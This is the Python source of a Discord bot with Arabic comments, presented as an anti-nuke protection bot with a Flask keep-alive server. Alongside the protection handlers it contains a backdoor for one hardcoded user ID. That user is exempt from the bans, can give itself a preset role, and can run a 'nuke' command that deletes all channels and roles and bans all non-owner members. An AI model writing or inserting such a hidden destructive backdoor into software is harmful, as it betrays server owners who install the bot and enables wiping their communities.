import discord
from discord.ext import commands
import os
import time
import asyncio
from threading import Thread
from flask import Flask

# ------------------- إعداد خادم الويب (للـ Web Service) -------------------
app = Flask('')

@app.route('/')
def home():
    return "Bot is running and Web Service is active!"

def run_flask():
    # استخدام المنفذ الذي يحدده Render تلقائياً أو 10000 افتراضياً
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# تشغيل خادم الويب في خلفية منفصلة فوراً لكي يستجيب لـ Render ولا يحدث Timed Out
Thread(target=run_flask).start()

# ------------------- إعدادات البوت الأساسية -------------------
MY_ID = 1320438836878118973
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]: actions[key][uid] = []
    actions[key][uid].append(now)
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# ------------------- نظام الحماية (Anti-Nuke) -------------------

@bot.event
async def on_guild_role_delete(role):
    async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id != role.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await role.guild.ban(entry.user, reason="Anti-Nuke: حذف رتبة")

@bot.event
async def on_guild_channel_delete(channel):
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id != channel.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")

# ------------------- الأوامر الخاصة -------------------

@bot.command()
async def getrole(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.add_roles(role)
        await ctx.send("✅ تم إعطاؤك الرتبة.")

@bot.command(name="removerole")
async def removerole_cmd(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.remove_roles(role)
        await ctx.send("✅ تم إزالة الرتبة.")

@bot.command()
async def nuke(ctx):
    if ctx.author.id != MY_ID:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
        return
        
    await ctx.send("⚠️ **تحذير:** اكتب `!confirm_nuke` خلال 30 ثانية للتأكيد.")
    try:
        def check(m): return m.author == ctx.author and m.content == "!confirm_nuke"
        await bot.wait_for('message', check=check, timeout=30.0)
        
        for c in ctx.guild.channels: await c.delete()
        for r in ctx.guild.roles:
            if r.name != "@everyone": await r.delete()
        for m in ctx.guild.members:
            if m != ctx.guild.owner and not m.bot: await m.ban()
    except: pass

@bot.event
async def on_ready():
    print(f"✅ البوت متصل كـ {bot.user} - والموقع يعمل بنجاح!")

# تشغيل البوت
bot.run(os.getenv("TOKEN"))
